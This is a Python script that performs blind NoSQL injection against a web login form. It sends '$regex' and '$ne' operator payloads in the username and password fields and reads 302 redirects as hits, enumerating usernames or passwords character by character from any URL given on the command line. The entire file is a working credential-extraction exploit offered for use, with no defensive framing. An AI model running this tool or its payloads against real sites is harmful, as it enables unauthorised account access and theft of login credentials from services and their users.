import requests
import string
import argparse

class extract:
	def __init__(self,url,payuser,paypass,head):
		self.url = url
		self.payuser = payuser
		self.paypass = paypass
		self.head = head
	def juicer(self,flag):
		f = flag
		y= []
		cnt = 0
		print("starting phase [1],this will take a little time:")
		for i in string.printable:
			if i not in  "$^&*+\.?|":
				if f == 0:
					self.payuser['username[$regex]'] = "^" + i + ".*"
					r = requests.post(self.url,data=self.payuser,headers=self.head,allow_redirects=False)
				else:
					self.paypass['password[$regex]'] = "^" + i + ".*"
					r = requests.post(self.url,data=self.paypass,headers=self.head,allow_redirects=False)
				if r.status_code == 302:
					#print(i)
					y.append(i+'.*')
		print("phase [1] complete.")
		print("Starting phase [2] \n Gathering Username/Password...")
		for i in string.printable:
			if cnt < len(y):
				x = y[cnt][:-2]
			else:
				break
			for j in string.printable:
				if j not in "$^&\*+.?|":
					y[cnt] = x + j + '.*'
					if f == 0:
						self.payuser['username[$regex]'] = '^' + y[cnt]
						r = requests.post(self.url,data=self.payuser,headers=self.head,allow_redirects=False)
					else:
						self.paypass['password[$regex]'] = '^' + y[cnt]
						r = requests.post(self.url,data = self.paypass,headers=self.head,allow_redirects=False)
					if r.status_code == 302:
						print("[+]FOUND",y[cnt][:-2])
						break
					else:
						print("[-]NOPE",y[cnt][:-2])
				if j == '~' and cnt < len(y):
					cnt = cnt + 1
					break
		print("phase [2] ends:")
		print("Found:")
		for i in y:
			print(i[:-3])




example = '''
juice.py -url example.com -user
juice.py -url example.com -pass
'''
parser =  argparse.ArgumentParser(epilog=example)
parser.add_argument('-url',help='http://example.com/',type=str)
#parser.add_argument('-u/p',help="user/pass",type=str)
args = parser.parse_args()

pu = {'username[$regex]':'','password[$ne]':'pass','login':'login'}
ps = {'username[$ne]':'uuss','password[$regex]':'','login':'login'}
he = {'Content-Type':'application/x-www-form-urlencoded'}


if args.url:
	url = args.url


t = extract(url,pu,ps,he)

inp = int(input("Enter [1] for Username Enumeration or [2] for password:"))
if inp == 1:
	t.juicer(0)
else:
	t.juicer(1)

